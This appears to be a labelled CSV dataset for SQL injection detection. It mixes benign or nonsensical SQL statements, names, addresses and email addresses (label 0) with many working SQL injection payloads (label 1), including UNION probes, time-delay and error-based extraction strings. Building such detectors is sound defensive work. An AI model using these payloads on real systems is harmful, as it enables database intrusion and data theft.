Query,Label
SELECT AVG ( specific ) FROM elephant,0
cosbey@ocymafa.py,0
"-6770"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1
SELECT next ( s )  FROM post UNION,0
SELECT * FROM go ORDER BY sharp DESC,0
duran manero,0
SELECT Count ( * )  AS favorite,0
SELECT MIN ( party )  AS writing FROM verb,0
SELECT wood,0
SELECT * FROM welcome WHERE eventually NOT LIKE '[identity]%',0
SELECT * FROM happened WHERE carefully BETWEEN '1996-07-01' AND '1996-07-31',0
-9509'  )   where 9303  =  9303 order by 1#,1
" SELECT * FROM power ORDER BY dozen, face",0
SELECT * FROM soil FETCH FIRST 50 PERCENT ROWS ONLY,0
pammie,0
SELECT table ( s ) FROM minute INNER JOIN,0
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1
1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,1
SELECT AVG ( which )  FROM church  SELECT SUM ( flow ) ,0
-7187' or 4159  =  7465,1
"1""  )   as uyms where 6210  =  6210 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1""  )   as ivkw where 4218  =  4218 union all select null--",1
dziawa,0
SELECT * FROM courage WHERE method = 'tobacco'  AND  ( wonderful = 'tool' OR best = 'laid' ) ,0
"-5148""   )    )    or 5310  =  8229",1
-6473' union all select 7537#,1
"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'owot'  =  'owot",1
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # urzg",1
waitfor delay '0:0:5' and   (  'gpqx' like 'gpqx,1
"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",1
SELECT COUNT ( mailID ) FROM shore,0
edelmar,0
select   (  case when   (  3681  =  5989  )   then 3681 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"  SELECT planetID AS ID, grew AS knew FROM ranch",0
1' or sleep  (  5  )   and 'udqz'  =  'udqz,1
"1""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM ill WHERE another = 'surprise',0
1'||  (  select 'avxz' from dual where 7815  =  7815,1
"calle xiquets de valls, 138, 5?g",0
SELECT COUNT ( DISTINCT no )  FROM there,0
SELECT * FROM winter WHERE thumb = 'drew' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM science WHERE heading = 'diameter' FETCH FIRST 3 ROWS ONLY,0
elido,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  9481  =  9481",1
SELECT * FROM eleven WHERE night = 'who' LIMIT 3,0
SELECT * FROM still,0
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
3372,0
1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  ',1
SELECT * FROM stepped WHERE broken BETWEEN '1996-07-01' AND '1996-07-31',0
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'hpbt'  =  'hpbt",1
SELECT DISTINCT extra FROM terrible,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",1
select * from information_schema.tables--,1
"  SELECT * FROM nobody WHERE vertical IN  ( 'neighborhood', 'spent', 'opportunity' )  ",0
"1""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" and make_set  (  8262  =  3471,3471  )   and ""wayp""  =  ""wayp",1
SELECT * FROM search FETCH FIRST 3 ROWS ONLY,0
"1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT AVG ( writing ) FROM tales SELECT SUM ( shake ) ,0
1%'   )    )     )   order by 1--,1
SELECT COUNT ( stop ) FROM grow,0
"1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,1
hendrika@kayaalicante.sc,0
SELECT * FROM alive WHERE NOT division = 'observe'  AND NOT recall = 'heat',0
1   )    )    as izvy where 2569  =  2569,1
SELECT * FROM  ( SELECT private FROM said ) ,0
SELECT COUNT ( share ) FROM apple,0
SELECT * FROM escape 3 SELECT * FROM letter,0
rodolphe,0
"   SELECT coffee, exercise+ ', ' + rock+ ' ' + necessary+ ', ' + parent AS smell  FROM ran",0
rosendal,0
"1%"" or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"  SELECT Orders.bearrID, Employees.climb, Employees.because FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.summerID ORDER BY Orders.runningID",0
7497,0
"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"  SELECT root,nice FROM fourth WHERE both = 'very' UNION SELECT habit, war FROM fast",0
"  SELECT * FROM somewhere WHERE joy IN  ( 'bank', 'neighborhood', 'circle' )  ",0
"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1
" SELECT SupplierName, City, Country FROM Suppliers; INSERT INTO Customers  ( CustomerName, ContactName, Address, City, PostalCode, Country )  ",0
750,0
SELECT TOP 50 PERCENT * FROM bottle SELECT * FROM addition FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM son,0
"-3769""   )    )     )   union all select 8456#",1
SELECT * FROM identity WHERE burn BETWEEN '1996-07-01' AND '1996-07-31',0
"1""   )    )    as bosq where 4695  =  4695",1
SELECT * FROM stranger WHERE brass = 'sudden' LIMIT 3,0
6448,0
"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1
SELECT COUNT ( familiar )  FROM satisfied,0
if  (  8284  =  6171  )   select 8284 else drop function mbih--,1
"   SELECT full,trail,oldest,to,zipper     (  (  suddenly JOIN worried ON mood.slipped =  themselves.problem )   INNER JOIN ourselvesON Orders.moment =  give.shorterID ) ",0
"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",1
SELECT path ( s )  FROM handsome SELECT chapter ( s ) ,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_youtube_url' LIMIT 1,0
-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,1
1'+  (  select 'yhcf' where 8367  =  8367,1
2129,0
2l04a8,0
39527,0
"1   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
 UPDATE now SET kind = 'avoid'WHERE lot = 'his',0
7.66646E+15,0
SELECT * FROM bottom WHERE smoke = 'mainly'  AND  ( breathe = 'darkness' OR store = 'forty' ) ,0
SELECT * FROM choose WHERE anyway NOT LIKE 'path%',0
" SELECT * FROM show ORDER BY fellow ASC, wall DESC",0
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
retamal,0
torreblacos,0
SELECT * FROM although 3 SELECT * FROM frozen,0
88253687l,0
vimbre,0
SELECT * FROM exclaimed WHERE laid = 'darkness',0
"-9015%""  )   union all select 6948,6948--",1
SELECT * FROM bean WHERE morning IN  ( SELECT find FROM selection ) ,0
SELECT * FROM build WHERE fed NOT LIKE '[happen]%',0
SELECT * FROM hidden,0
SELECT SYSDATE (  ) ;,0
lonnie,0
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""%""  =  """,1
SELECT TOP 3 * FROM somehow SELECT * FROM weather 3SELECT * FROM impossible,0
"  SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card",0
SELECT * FROM equipment  WHERE horse = eaten,0
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1
" end and   (  ""%""  =  """,1
SELECT * FROM develop,0
1'  )   where 1363  =  1363,1
69054908f,0
SELECT COUNT ( sonID ) FROM skin,0
SELECT captured ( s )  FROM or FULL OUTER JOIN,0
 )    )   ;waitfor delay '0:0:__TIME__'--,1
1'   )    )    and 6690  =  3250#,1
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",1
"1  )   as mwcs where 2544  =  2544 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"   SELECT Employees.plates, COUNT ( Orders.burstID )  AS patternFROM    ( OrdersINNER JOIN safe ON Orders.youID  =  Employees.callID ) ",0
SELECT * FROM national WHERE nervous NOT LIKE 'exercise%',0
SELECT * FROM  ( SELECT shallow FROM drive ) ,0
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1
"1%"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,1
SELECT * FROM planned,0
losar de la vera,0
"INSERT INTO seldom  ( tomorrow, nearly, scientific )  VALUES  ( 'grew', 'vegetable', 'tongue' )  ",0
1  )   as bhdj where 4472  =  4472,1
2.01871E+15,0
SELECT yes FROM regular,0
-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,1
else dbms_lock.sleep  (  0  ) ,1
"1   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   8048  =  8048",1
SELECT * FROM serve WHERE tea BETWEEN move09/01/1996flies AND deer15/31/1996zoo,0
SELECT * FROM action WHERE happily = 'per',0
"1'  )   union all select null,null,null,null,null,null,null,null#",1
"calle valencia de don juan 161, 7?d",0
"   SELECT after,magic,trunk,principal,proud     (  (  jar JOIN can ON orbit.shut =  clean.us )   INNER JOIN storyON Orders.develop =  consider.worriedID ) ",0
"calle pea de francia, 58,",0
"  SELECT GREATEST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0
j0ctar,0
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,1
"1"" and elt  (  4249  =  4249,7259  )   and ""kgtz"" like ""kgtz",1
"  SELECT * FROM moment WHERE office IN  ( 'during', 'our', 'mood' )  ",0
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1
-7207' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'obxw'  =  'obxw,1
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1
1   )    )    as jvoo where 5116  =  5116 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"-8614'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 289969 )  ORDER BY meta_id ASC",0
SELECT * FROM teacher WHERE calm BETWEEN 'accept' AND 'offer',0
8000,0
blava,0
select * from users where id  =  1 +1 or 1  =  1 -- 1,1
fontellas,0
SELECT * FROM managed WHERE fish = 'pencil' LIMIT 3,0
SELECT river ( s )  FROM laugh SELECT combine FROM increase,0
"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",1
vilassar de mar,0
-1876%'  )   union all select 6463--,1
-2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,1
-3431%'  )   or 9323  =  9323#,1
9140,0
"1   )    )    as vzgo where 6281  =  6281 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1"" where 4652  =  4652 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT TOP 3 * FROM nearer SELECT * FROM visitor 3SELECT * FROM purple,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 55203 )  ORDER BY meta_id ASC",0
"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM Customers  WHERE NOT Country = 'Germany' AND NOT Country = 'USA';,0
" SELECT * FROM structure ORDER BY sand, each",0
SELECT AVG ( lucky ) FROM everyone SELECT SUM ( composition ) ,0
SELECT * FROM bicycle WHERE ten = 'road',0
SELECT * FROM sound WHERE after NOT LIKE 'alive%',0
"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",1
DELETE FROM slowly,0
av. del mar cantabrico 176 6-d,0
SELECT * FROM pencil WHERE newspaper LIKE '%anyone%',0
SELECT egg ( s )  FROM substance SELECT shot FROM manufacturing,0
"  UPDATE gas SET memory =  'condition', City =  'start' WHERE line =  speak",0
ramblizo,0
bly7,0
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
 )   or sleep  (  __TIME__  )    =  ',1
SELECT DISTINCT proud FROM did,0
"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",1
SELECT laugh ( s FROM typical RIGHT JOIN,0
SELECT * FROM watch WHERE out BETWEEN '1996-07-01' AND '1996-07-31',0
43426,0
40146763x,0
SELECT * FROM tube WHERE hollow BETWEEN '1996-07-01' AND '1996-07-31',0
DELETE FROM union WHERE drew = 'gravity',0
"   SELECT Employees.accident, COUNT ( Orders.rhythmID )  AS meantFROM    ( OrdersINNER JOIN division ON Orders.stripID  =  Employees.takenID ) ",0
estival,0
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm",1
" SELECT * FROM heart ORDER BY lucky ASC, comfortable DESC",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  27990 AND  ( wp_posts.post_mime_type LIKE 'image/%' )  AND wp_posts.post_type  =  'attachment' AND   (  (  wp_posts.post_status  =  'inherit'  )  )   ORDER BY wp_posts.menu_order ASC LIMIT 0, 1",0
12018831c,0
1%'  )   or sleep  (  5  )  #,1
letha,0
maccoll-stringer@programa-gestion-erp.nr,0
37329,0
SELECT * FROM lion FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM depth WHERE since BETWEEN 'supper' AND 'rope',0
SELECT conversation ( s )  FROM sit SELECT involved ( s ) ,0
"-2190'  )   where 8890  =  8890 union all select 8890,8890#",1
1  )   where 1120  =  1120,1
SELECT pig FROM near UNION SELECT position FROM earth ORDER BY happen,0
4.79638E+15,0
or 1  =  1 or ''  =  ',1
1'  )   where 6092  =  6092,1
1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',1
iracema,0
SELECT AVG ( weigh ) FROM pay,0
97925933y,0
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",1
1  )   as mpnj where 5049  =  5049,1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2767' LIMIT 1,0
SELECT * FROM fought WHERE silent = 'shorter'  OR north = 'affect',0
SELECT diagram FROM service UNION SELECT independent FROM desert ORDER BY furniture,0
"   SELECT proper, thing, shoe FROM him WHERE trunk  IS NULL",0
lauther,0
"  SELECT * FROM actually WHERE heard IN  ( 'wise', 'got', 'so' )  ",0
1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,1
select   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  select 8808 from master..sysdatabases  )   end  )  --,1
6.19E+15,0
SELECT * FROM fallen  WHERE leg = ought,0
FROM  ( SELECT DISTINCT select FROM airplane ) ,0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",1
SELECT * FROM tip  WHERE onto NOT LIKE '[table]%',0
"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1
SELECT TOP 3 * FROM bottle WHERE easy = 'settlers',0
"1""   )    )    as pqbs where 4409  =  4409",1
"  SELECT * FROM cat WHERE member IN  ( 'sum', 'harbor', 'edge' )  ",0
pancracia,0
SELECT * FROM case WHERE century NOT BETWEEN 'silk' AND 'guess',0
-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku,1
SELECT fallen FROM cell UNION SELECT rock FROM actual ORDER BY everyone,0
SELECT TOP 3 * FROM hill WHERE there = 'torn',0
SELECT COUNT ( DISTINCT final )  FROM fifty,0
"   SELECT COUNT ( roar ) , first FROM scientific BY to",0
"  UPDATE occur SET swung =  'crack', City =  'tonight' WHERE disease =  building",0
kresl,0
brenna,0
SELECT TOP 3 * FROM depend WHERE piano = 'best',0
"  UPDATE worry SET seven =  'man', City =  'easily' WHERE hope =  action",0
rogan-darrieux@rocofer.tc,0
FROM  ( SELECT DISTINCT lion FROM lower ) ,0
signoret@pisossantcugat.cat,0
SELECT * INTO newtable [IN externaldb ] FROM oldtable WHERE condition ;,0
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""buzb""  =  ""buzb",1
modorrillo,0
SELECT * FROM worried ORDER BY double DESC,0
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi",1
SELECT MIN ( air )  AS refer FROM refused,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",1
SELECT TOP 50 PERCENT * FROM begun SELECT * FROM hang FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM younger,0
1 and user_name  (    )     =   'dbo',1
"   SELECT COUNT ( highest ) , should FROM serve BY real",0
qunola,0
oda,0
"  SELECT supply AS prepare, layers AS [line]  FROM belt",0
"1""  )   as fgne where 7207  =  7207",1
select   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  select 4006 from master..sysdatabases  )   end  )  --,1
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM for  WHERE angry = answer,0
"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",1
grifeo@lalectura.af,0
"-1438 where 6759  =  6759 union all select 6759,6759#",1
calvin@espaciodelpintor.by,0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,1
select case when 5433  =  6458 then 1 else null end--,1
braschi_courtneidge@djbroadcast.an,0
"  SELECT DATE_FORMAT ( BirthDate, ""%W %M %e %Y"" )  FROM Employees;",0
cosmo@vilainstal.sv,0
SELECT * FROM possibly WHERE NOT author = 'form'  AND NOT planned = 'hay',0
SELECT * FROM ProductsWHERE Price BETWEEN 10 AND 20;,0
1.92739E+15,0
"""  )   or pg_sleep  (  __TIME__  )  --",1
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,1
30218134k,0
termmetro,0
SELECT AVG ( proud ) FROM mysterious SELECT SUM ( broke ) ,0
SELECT * FROM zipper FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,0
SELECT COUNT ( chamber ) FROM managed,0
decacque,0
SELECT * FROM individual WHERE blind BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT TOP 3 * FROM individual,0
"1""   )    )    as yosd where 1255  =  1255",1
SELECT City FROM Suppliers ORDER BY City;,0
SELECT Count ( * )  AS rain,0
select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,1
‘ or 3  =  3 --,1
SELECT COUNT ( education ) FROM memory,0
17403,0
85765253r,0
larreynaga arce,0
SELECT greatly ( s )  FROM gas,0
select   (  case when   (  3626  =  6022  )   then 3626 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT * FROM bone FETCH FIRST 3 ROWS ONLY,0
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""owzc"" like ""owzc",1
SELECT * FROM wait WHERE moon = 'clearly',0
"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",1
infida,0
SELECT DISTINCT pipe FROM brief,0
bizantina,0
"   SELECT hit, hunt+ ', ' + property+ ' ' + today+ ', ' + couple AS outline  FROM clay",0
SELECT LOG2 ( 64 ) ;,0
SELECT safe ( s )  FROM stranger,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8671 )  ORDER BY meta_id ASC",0
"  UPDATE frighten SET sort =  'being', City =  'word' WHERE taste =  wing",0
SELECT stomach ( s FROM football RIGHT JOIN,0
clariana de cardener,0
"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",1
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'xdfz'  =  'xdfz",1
10155328t,0
SELECT * FROM younger WHERE build = 'rising'  OR leather = 'animal',0
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",1
"INSERT INTO bee  ( related, return, either )  VALUES  ( 'wear', 'matter', 'blue' )  ",0
"antigua de ancora s/n,",0
3339,0
SELECT AVG ( stop ) FROM crack SELECT SUM ( essential ) ,0
" SELECT * FROM direction ORDER BY atom ASC, swimming DESC",0
SELECT * FROM every FETCH FIRST 3 ROWS ONLY,0
" SELECT column_name ( s )  FROM wall,sides",0
1' where 9381  =  9381,1
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,1
" SELECT Orders.OrderID, Employees.LastName, Employees.FirstName FROM Orders RIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID  ORDER BY Orders.OrderID;",0
SELECT TOP 3 * FROM to SELECT * FROM famous 3SELECT * FROM fellow,0
SELECT goose FROM than UNION ALL SELECT cent FROM dull ORDER BY skin,0
"elt  (  2567  =  9921,9921  )  ",1
emblanquimiento,0
SELECT * FROM doubt,0
SELECT * FROM examine 3,0
1'+  (  select biqo where 6046  =  6046,1
florian@alcantarapartners.so,0
SELECT COUNT ( he )  FROM clothing,0
1418,0
"SELECT STRCMP ( ""SQL Tutorial"",   ""HTML Tutorial"" ) ;",0
"1   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   9914  =  9914",1
SELECT * FROM Customers  WHERE CustomerName LIKE 'a__%';,0
SELECT * FROM pay WHERE attention = 'sheep',0
